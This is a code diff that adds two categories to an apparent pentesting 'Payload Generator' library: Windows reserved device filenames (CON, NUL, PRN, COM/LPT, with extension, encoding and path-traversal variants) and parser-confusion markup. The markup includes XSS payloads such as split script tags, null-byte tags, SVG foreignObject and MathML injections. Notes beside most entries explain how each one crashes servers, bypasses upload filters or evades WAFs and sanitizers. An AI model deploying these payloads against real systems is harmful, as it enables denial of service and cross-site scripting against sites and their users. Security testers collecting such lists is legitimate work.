@@ -640,6 +640,71 @@ const CATEGORIES: PayloadCategory[] = [
       { name: "Time-based price bypass",          payload: `Apply promo code, change system time, checkout` },
     ],
   },
+  {
+    key: "win_reserved",
+    label: "Windows Reserved Names",
+    description: "Windows device filename DoS/bypass — CON, NUL, AUX, PRN, COM1–COM9, LPT1–LPT9 cause crashes, hangs, or filter bypasses in Windows apps and web servers",
+    color: "text-blue-400",
+    payloads: [
+      { name: "CON — bare",                         payload: `CON`,                                        note: "Console device — freezes any Windows app that tries to open/write this" },
+      { name: "NUL — bare",                         payload: `NUL`,                                        note: "Null device — discards all data; causes silent write failures" },
+      { name: "AUX — bare",                         payload: `AUX`,                                        note: "Auxiliary port — alias for COM1; hangs on open" },
+      { name: "PRN — bare",                         payload: `PRN`,                                        note: "Printer device — hangs if no printer attached" },
+      { name: "COM1 – COM9",                        payload: `COM1`,                                       note: "Serial port devices — substitute COM2–COM9; hangs on open" },
+      { name: "LPT1 – LPT9",                        payload: `LPT1`,                                       note: "Parallel port devices — substitute LPT2–LPT9; hangs on open" },
+      { name: "CON with extension",                  payload: `CON.txt`,                                    note: "Windows strips the extension — still resolves to CON device" },
+      { name: "NUL with PHP extension",              payload: `NUL.php`,                                    note: "File upload filter sees .php but Windows opens NUL — bypass + DoS" },
+      { name: "CON with image extension",            payload: `CON.jpg`,                                    note: "File upload bypass — passes MIME check, crashes on write" },
+      { name: "AUX with double extension",           payload: `AUX.php.jpg`,                                note: "Double extension + device name" },
+      { name: "CON trailing dot",                    payload: `CON.`,                                       note: "Windows strips trailing dot — resolves to CON device; bypasses basic filters" },
+      { name: "CON trailing spaces",                 payload: `CON   `,                                     note: "Windows strips trailing spaces — resolves to CON device" },
+      { name: "CON as directory component",          payload: `/uploads/CON/file.txt`,                      note: "Device name in path segment causes hang during path resolution" },
+      { name: "NUL in URL path",                    payload: `/files/NUL.pdf`,                             note: "Server-side file operation on this path hangs on Windows" },
+      { name: "CON URL-encoded",                    payload: `%43%4F%4E`,                                  note: "URL-decoded to CON — bypasses string-match filters" },
+      { name: "CON — JSON filename field",           payload: `{"filename":"CON","type":"text/plain"}`,     note: "Embed in JSON body for API file upload endpoints" },
+      { name: "NUL — multipart filename",            payload: `Content-Disposition: form-data; name="file"; filename="NUL.pdf"`, note: "Multipart upload — server hangs writing to NUL" },
+      { name: "CON — XML filename element",         payload: `<filename>CON</filename>`,                   note: "XML body with device name in filename field" },
+      { name: "CON mixed case",                     payload: `con`,                                        note: "Windows device names are case-insensitive — con = CON = Con" },
+      { name: "CON Unicode fullwidth",              payload: `ＣＯＮ`,                                      note: "Fullwidth Unicode chars — some normalizers map to CON" },
+      { name: "Path traversal to CON",              payload: `../../CON`,                                  note: "Combine path traversal with device name" },
+      { name: "CON in ZIP entry name",              payload: `CON.txt (inside zip archive)`,               note: "Zip extraction to CON device name causes hang on Windows" },
+      { name: "PRN in Content-Disposition",         payload: `filename="PRN.docx"`,                       note: "Download trigger with PRN device name crashes IIS/Windows handlers" },
+      { name: "All device names — wordlist",        payload: `CON\nNUL\nAUX\nPRN\nCOM1\nCOM2\nCOM3\nCOM4\nCOM5\nCOM6\nCOM7\nCOM8\nCOM9\nLPT1\nLPT2\nLPT3\nLPT4\nLPT5\nLPT6\nLPT7\nLPT8\nLPT9`, note: "Full wordlist for fuzzing filename parameters" },
+    ],
+  },
+  {
+    key: "parser_confusion",
+    label: "Parser Confusion",
+    description: "Malformed markup, tag nesting attacks, and HTML/XML parser confusion — bypass WAFs, sanitizers, and crash legacy parsers that fail on invalid input",
+    color: "text-fuchsia-400",
+    payloads: [
+      { name: "Nested unclosed tags",               payload: `<a href=<<font<<b`,                          note: "Unclosed/nested tags confuse HTML parsers and WAFs that track tag state" },
+      { name: "Broken self-close chain",            payload: `</<a href=<<font`,                           note: "Invalid self-close with nested attributes — breaks tag-balance validators" },
+      { name: "Mixed case tag splitting",           payload: `<fade<Fade<alt<Alt`,                         note: "Mixed-case repeated tags confuse case-insensitive parsers" },
+      { name: "Script tag split — reassembly",      payload: `<sc<script>ript>alert(1)</sc</script>ript>`, note: "WAF strips inner <script>, outer fragments reassemble into working tag" },
+      { name: "Style/pre confusion",                payload: `</style><style><pre=>`,                      note: "Closing non-open tags then reopening — confuses CSS-aware parsers" },
+      { name: "HTML comment flooding",              payload: `<!--<!--<!--<!--<!--<!--<!--<!--<!--<!--`,     note: "Nested/unclosed comments break comment-stripping sanitizers" },
+      { name: "Recursive attribute injection",      payload: `<font size=<<SIZE=?<url<<font size=<<color=>>`, note: "Attribute values that contain tag-like syntax confuse attribute parsers" },
+      { name: "Angle bracket flood",                payload: `<<<<<<<<<<<<<<<<<<<<`,                       note: "Raw flood of opening angle brackets — buffer/state machine exhaustion" },
+      { name: "Invalid close tag flood",            payload: `</</</</</</</</</</</</</</</</</</`, note: "Repeated invalid close tags — triggers parser error recovery loops" },
+      { name: "Mixed open/close flood",             payload: `<>><><><><><><><><>`,                        note: "Alternating open/close with no tag name — parser state confusion" },
+      { name: "Bracket and entity mix",             payload: `&lt;<script&gt;alert(1)&lt;</script&gt;`,    note: "Mix raw brackets and HTML entities — some decoders reassemble into script" },
+      { name: "Null byte in tag",                   payload: `<scr\x00ipt>alert(1)</scr\x00ipt>`,         note: "Null byte inside tag name — bypasses string-match WAF rules" },
+      { name: "Tab/newline in tag",                 payload: "<img\tsrc=x\nonerror=alert(1)>",             note: "Whitespace variants inside tags — bypasses regex-based filters" },
+      { name: "Double-open bracket",                payload: `<<script>alert(1)<</script>`,                note: "Double opening bracket — some parsers skip first, execute second" },
+      { name: "Attribute without quotes — chained", payload: `<img src=x onerror=alert(1) <img src=y>`,   note: "Unchained attributes with embedded second tag" },
+      { name: "CDATA in HTML context",              payload: `<![CDATA[<script>alert(1)</script>]]>`,      note: "CDATA section valid in XML/SVG — may pass HTML sanitizers" },
+      { name: "PI (processing instruction)",        payload: `<?xml-stylesheet type="text/xsl" href="data:,<xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform'/>">`, note: "XML PI injection in SVG/XML context" },
+      { name: "Deeply nested tags",                 payload: `<b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b>x</b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b>`, note: "Deep nesting causes quadratic parser behavior (ReDoS-style)" },
+      { name: "Unclosed tag at EOF",                payload: `<div class="x"><span id="y"><b>text`,       note: "Unterminated tags — tests error-recovery path in parsers" },
+      { name: "Foreign content (MathML in HTML)",   payload: `<math><mtext></p><img src=x onerror=alert(1)>`, note: "MathML parsing switches context — img inside mtext may execute" },
+      { name: "SVG foreignObject XSS",              payload: `<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>`, note: "SVG namespace switch into HTML — script executes in some browsers" },
+      { name: "Broken fade color chain",            payload: `<fade #C60000, #000000, #C60000, #000000, #C60000, #000000>`, note: "Yahoo Messenger-style chat markup — crashes IM clients that parse color tags" },
+      { name: "Windows device in snd tag",          payload: `<snd=con/con>`,                              note: "Legacy chat booter: snd tag referencing CON device causes Windows app crash" },
+      { name: "NUL device sound tag",               payload: `<snd=nul/nul>`,                              note: "NUL device in sound attribute — legacy crash vector for IM parsers" },
+      { name: "Repeated garbage attributes",        payload: `<font size=<size=<size=<size=<size=<size=`,  note: "Cascading malformed attribute values — exhausts regex backtracking in WAFs" },
+    ],
+  },
 ];
 
 export default function PayloadGen() {
@@ -671,7 +736,7 @@ export default function PayloadGen() {
       <div>
         <h1 className="text-2xl font-bold text-white">Payload Generator</h1>
         <p className="text-white/60 text-sm mt-1">
-          Comprehensive payload library — XSS · SQLi · CMDi · LFI · SSRF · XXE · SSTI · NoSQL · Reverse Shells · WAF Bypass · HTTP Smuggling · GraphQL · Deserialization · CRLF · Open Redirect · OAuth/OIDC · CSRF · CORS · File Upload · Business Logic
+          Comprehensive payload library — XSS · SQLi · CMDi · LFI · SSRF · XXE · SSTI · NoSQL · Reverse Shells · WAF Bypass · HTTP Smuggling · GraphQL · Deserialization · CRLF · Open Redirect · OAuth/OIDC · CSRF · CORS · File Upload · Business Logic · Windows Reserved Names · Parser Confusion
         </p>
       </div>
 
